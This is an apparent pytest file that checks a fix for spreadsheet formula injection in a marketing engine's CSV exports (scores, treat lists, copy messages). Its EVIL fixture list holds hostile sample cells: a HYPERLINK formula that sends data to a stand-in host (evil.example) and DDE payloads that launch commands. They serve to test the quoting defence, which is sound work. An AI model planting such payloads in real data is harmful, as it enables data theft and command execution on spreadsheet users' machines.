"""Spreadsheet formula injection in downloaded lists (security review 2, M-3).

An end customer controls what their id, name or e-mail says. `=HYPERLINK(...)` as an id reached the
marketer's Excel unchanged through `scores.csv`, `treat_list.csv` and `copy_messages.csv`. Every CSV a person
downloads now writes a text cell that starts with `= + - @ tab CR` with a leading quote; numbers (a negative
net value), the Parquet files and ordinary text are left exactly as they were.
"""

from __future__ import annotations

import csv
import io
from pathlib import Path
from typing import Any

import pandas as pd
import pyarrow as pa
import pytest

from engine.decide.treat_list import TREAT_LIST_CSV, ensure_treat_list, table_csv_bytes
from engine.generative.contracts import CopyMessage, CopyStatus
from engine.generative.win_back import _write_messages_csv
from engine.stages.export import SCORES_CSV
from engine.storage import LocalStorage, run_key
from engine.utils.csv_safe import formula_safe, formula_safe_frame
from tests.fixtures.decide import treat_runs

EVIL = [
    '=HYPERLINK("https://evil.example/?d="&C2&D2,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
]


def _cells(data: bytes, column: str) -> list[str]:
    rows = list(csv.DictReader(io.StringIO(data.decode("utf-8"), newline="")))
    return [row[column] for row in rows]


def test_the_helper_prefixes_only_what_a_spreadsheet_would_run() -> None:
    assert [formula_safe(v) for v in EVIL] == ["'" + v for v in EVIL]
    for harmless in ("", "C-001", "a=b", "1,5", "x@y.com", "Anna - Lee", " =1"):
        assert formula_safe(harmless) == harmless


def test_the_frame_helper_touches_text_cells_only() -> None:
    frame = pd.DataFrame({"id": [*EVIL, "C-1"], "net": [-1.5] * 7, "n": [-3] * 7, "flag": [True] * 7})
    safe = formula_safe_frame(frame)
    assert list(safe["id"]) == ["'" + v for v in EVIL] + ["C-1"]
    assert safe[["net", "n", "flag"]].equals(frame[["net", "n", "flag"]])
    assert next(iter(frame["id"])) == EVIL[0]  # the caller's frame is not changed
    clean = pd.DataFrame({"id": ["C-1"], "net": [-1.0]})
    assert formula_safe_frame(clean) is clean


def test_the_treat_list_csv_kernel_quotes_text_and_leaves_numbers_alone() -> None:
    table = pa.table(
        {
            "customer_id": pa.array([*EVIL, "plain", None]),
            "net_value": pa.array([-1.5] * 8),
            "rank": pa.array([-3] * 8, pa.int64()),
            "treat": pa.array([True] * 8),
        }
    )
    data = table_csv_bytes(table)
    assert _cells(data, "customer_id") == ["'" + v for v in EVIL] + ["plain", ""]
    assert set(_cells(data, "net_value")) == {"-1.5"} and set(_cells(data, "rank")) == {"-3"}


def test_copy_messages_csv_is_formula_safe(tmp_path: Path) -> None:
    storage = LocalStorage(tmp_path)
    messages = [
        CopyMessage(
            entity_key=evil,
            band="High",
            channel="sms",
            variant="A",
            template_id="t1",
            rendered_text=evil,
            status=CopyStatus.APPROVED,
            backend="fake",
        )
        for evil in EVIL[:4]  # the contract strips a leading tab or CR
    ]
    _write_messages_csv(storage, "r_20261001_0c000001", messages)
    data = storage.read_bytes(run_key("r_20261001_0c000001", "copy_messages.csv"))
    assert _cells(data, "entity_key") == ["'" + v for v in EVIL[:4]]
    assert _cells(data, "rendered_text") == ["'" + v for v in EVIL[:4]]


@pytest.fixture
def hostile_customers(monkeypatch: pytest.MonkeyPatch) -> None:
    original = treat_runs._customers

    def customers(rows: int, **kwargs: Any) -> pd.DataFrame:
        frame = original(rows, **kwargs)
        frame["customer_id"] = frame["customer_id"].astype(object)
        for position, evil in enumerate(EVIL[:4]):  # a key's leading tab or CR is stripped on the way in
            frame.loc[position, "customer_id"] = f"{evil}#{position}" if position % 2 else evil
        return frame

    monkeypatch.setattr(treat_runs, "_customers", customers)


def test_the_real_scores_and_treat_list_csv_carry_no_live_formula(
    tmp_path: Path, hostile_customers: None
) -> None:
    storage = LocalStorage(tmp_path)
    written = treat_runs.write_run(storage, "r_20261001_0c000002", kind="propensity", rows=24)
    ensure_treat_list(storage, written.run_id)
    for name in (SCORES_CSV, TREAT_LIST_CSV):
        text = storage.read_bytes(run_key(written.run_id, name)).decode("utf-8")
        for row in csv.reader(io.StringIO(text, newline="")):
            for cell in row:
                assert not cell.startswith(("=", "+", "@", "\t", "\r")), (name, cell)
        assert any(
            cell.startswith("'=HYPERLINK")
            for row in csv.reader(io.StringIO(text, newline=""))
            for cell in row
        ), name
